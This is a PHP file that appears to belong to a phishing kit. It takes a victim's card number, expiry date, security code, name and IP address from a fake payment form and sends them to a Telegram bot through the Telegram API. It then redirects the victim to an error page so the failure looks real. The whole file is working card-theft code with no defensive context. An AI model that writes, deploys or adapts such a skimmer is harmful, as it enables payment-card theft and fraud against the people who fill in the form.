<?php
if (isset($_POST)) {

$filter = "";
$a1 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["HTTP_X_REAL_IP"] : getenv("REMOTE_ADDR"));
$a2 = (array_key_exists("HTTP_X_REAL_IP", $_SERVER) ? $_SERVER["REMOTE_ADDR"] : gethostbyaddr($_SERVER["REMOTE_ADDR"]));



if (isset($_POST["creditCardNumber"])) {   
    $a3 = $_POST["creditCardNumber"];    
} 

if (isset($_POST["creditExpirationMonth"])) {   
    $a4 = $_POST["creditExpirationMonth"];   
} 

if (isset($_POST["ccexpyear"])) { 
    $a5 = $_POST["ccexpyear"];
}

if (isset($_POST["creditCardSecurityCode"])) {
    $a6 = $_POST["creditCardSecurityCode"];
}

if (isset($_POST["firstName"])) {
    $a7 = $_POST["firstName"];
}

if (isset($_POST["lastName"])) {
    $a8 = $_POST["lastName"];
}

/*
if (isset($_POST["billingcountry"])) {
    $a9 = $_POST["billingcountry"];
}
*/

include("assets/t.php");

$mensaje = str_replace(
    array("{1}", "{2}", "{3}", "{4}", "{5}", "{6}", "{7}", "{8}"),
    array($a1, $a2, $a3, $a4, $a5, $a6, $a7, $a8, $a9),
    $message
);

define("BOT_TOKEN", $bottoken);
define("CHAT_ID", $chatid);
function enviar_telegram($msj)

{
    $queryArray = [
        "chat_id" => CHAT_ID,
        "text" => $msj,
    ];
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage?" . http_build_query($queryArray);
    $result = file_get_contents($url);

    header("Location: creditoption.php?error=1");

?>
  
    <!--script>window.history.back();</script-->
<?php   }

function enviar()
{
    global $telegram_send, $save_file, $email_send, $mensaje;
    enviar_telegram($mensaje);
}
enviar();
}

?>